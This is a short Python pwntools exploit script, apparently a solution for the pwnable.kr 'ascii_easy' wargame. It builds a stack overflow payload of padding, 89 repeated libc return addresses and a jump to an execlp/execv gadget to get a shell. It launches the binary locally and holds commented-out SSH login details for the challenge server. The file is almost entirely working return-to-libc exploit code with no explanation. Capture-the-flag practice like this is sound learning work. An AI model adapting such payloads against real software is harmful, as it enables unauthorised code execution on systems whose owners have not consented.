#!/bin/python3
# drunk ideas:
# 1. you can jump to an excecv function at the return addrss and then just
#    return like 50 times untils your stack reaches the argvs place
#    and then you can use the null from there to actually to terminate things
#    and jump to the crrect location

#argv_0 =  0xffffda86
#argv_1 =  0xffffdac6
# x/93wx $esp

from pwn import *
BASE = 0x5555e000


e = ELF("./libc-2.15.so")
execv_addr = e.symbols["execlp"] + BASE - 2 # the -1 is to make it ascii and there is just nop there
print(hex(execv_addr))
stack_stall_addr = e.symbols["execv"] + BASE + 51


stack_frame_padding = (0x1c + 4) * b'a'
stall_stack_padding = 89 * p32(stack_stall_addr)
payload = stack_frame_padding + stall_stack_padding + p32(execv_addr)
print(payload)

def start():
    gdbscript = '''
    tb *vuln+42
    '''
    io = process(executable='./ascii_easy', argv=['/bin/bash', payload.decode()])
    # gdb.attach(io, gdbscript=gdbscript)
    return io

io = start()
io.interactive()
exit(0)

s = ssh(host='pwnable.kr', user='ascii_easy', port=2222, password='guest')
io = s.process(executable='./ascii_easy', argv=['/bin/bash', payload])
io.interactive()
